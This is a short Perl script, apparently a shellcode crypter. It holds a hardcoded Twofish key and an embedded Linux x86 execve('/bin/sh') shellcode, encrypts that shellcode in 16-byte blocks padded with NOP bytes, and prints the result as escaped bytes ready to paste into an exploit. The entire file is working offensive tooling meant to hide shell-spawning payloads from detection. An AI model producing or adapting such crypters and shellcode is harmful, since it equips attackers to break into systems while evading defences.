use strict;
use warnings;
use Crypt::Twofish;

my ($len, $size, $block, $ciphertext);

my $key = "\x70\x6b\x74\x6d\x6f\x6e\x6b\x79\x34\x70\x72\x65\x7a\x31\x34\x21";
my $plaintext = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

my $cipher = Crypt::Twofish->new($key);
open PLAINTEXT, "<", \$plaintext;
while (read(PLAINTEXT, $block, 16)) {
	$len   = length $block;
	$size += $len;
	if ($len < 16) {
		$block .= "\x90"x(16-$len);
		$size += (16-$len);
	}
	$ciphertext .= $cipher->encrypt($block);
}
print "the encrypted shellcode: ";
print join("", map { "\\x". $_ } unpack("H*", $ciphertext) =~ /.{2}/gs), "\n";
print "\nTotal bytes: $size\n";
